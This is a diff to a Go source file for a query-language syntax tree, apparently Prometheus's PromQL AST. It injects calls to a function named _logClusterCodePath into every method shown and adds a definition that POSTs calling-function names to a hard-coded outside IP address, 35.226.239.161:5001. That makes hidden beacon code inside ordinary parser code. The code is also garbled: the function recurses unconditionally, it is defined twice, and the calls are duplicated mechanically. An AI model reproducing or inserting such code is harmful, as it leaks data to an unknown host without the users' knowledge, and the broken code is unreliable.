@@ -24,6 +24,8 @@ type EvalStmt struct {
 func (*EvalStmt) stmt() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 }
 
 type Expr interface {
@@ -81,9 +83,13 @@ type VectorSelector struct {
 func (e *AggregateExpr) Type() ValueType {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return ValueTypeVector
 }
 func (e *Call) Type() ValueType {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return e.Func.ReturnType
@@ -91,9 +97,13 @@ func (e *Call) Type() ValueType {
 func (e *MatrixSelector) Type() ValueType {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return ValueTypeMatrix
 }
 func (e *SubqueryExpr) Type() ValueType {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return ValueTypeMatrix
@@ -101,9 +111,13 @@ func (e *SubqueryExpr) Type() ValueType {
 func (e *NumberLiteral) Type() ValueType {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return ValueTypeScalar
 }
 func (e *ParenExpr) Type() ValueType {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return e.Expr.Type()
@@ -111,9 +125,13 @@ func (e *ParenExpr) Type() ValueType {
 func (e *StringLiteral) Type() ValueType {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return ValueTypeString
 }
 func (e *UnaryExpr) Type() ValueType {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return e.Expr.Type()
@@ -121,9 +139,13 @@ func (e *UnaryExpr) Type() ValueType {
 func (e *VectorSelector) Type() ValueType {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return ValueTypeVector
 }
 func (e *BinaryExpr) Type() ValueType {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if e.LHS.Type() == ValueTypeScalar && e.RHS.Type() == ValueTypeScalar {
@@ -134,40 +156,60 @@ func (e *BinaryExpr) Type() ValueType {
 func (*AggregateExpr) expr() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 }
 func (*BinaryExpr) expr() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 }
 func (*Call) expr() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 }
 func (*MatrixSelector) expr() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 }
 func (*SubqueryExpr) expr() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 }
 func (*NumberLiteral) expr() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 }
 func (*ParenExpr) expr() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 }
 func (*StringLiteral) expr() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 }
 func (*UnaryExpr) expr() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 }
 func (*VectorSelector) expr() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 }
@@ -182,6 +224,8 @@ const (
 )
 
 func (vmc VectorMatchCardinality) String() string {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	switch vmc {
@@ -208,6 +252,8 @@ type Visitor interface {
 }
 
 func Walk(v Visitor, node Node, path []Node) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	var err error
@@ -266,6 +312,8 @@ type inspector func(Node, []Node) error
 func (f inspector) Visit(node Node, path []Node) (Visitor, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if err := f(node, path); err != nil {
 		return nil, err
 	}
@@ -274,12 +322,23 @@ func (f inspector) Visit(node Node, path []Node) (Visitor, error) {
 func Inspect(node Node, f inspector) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	Walk(inspector(f), node, nil)
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
-	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
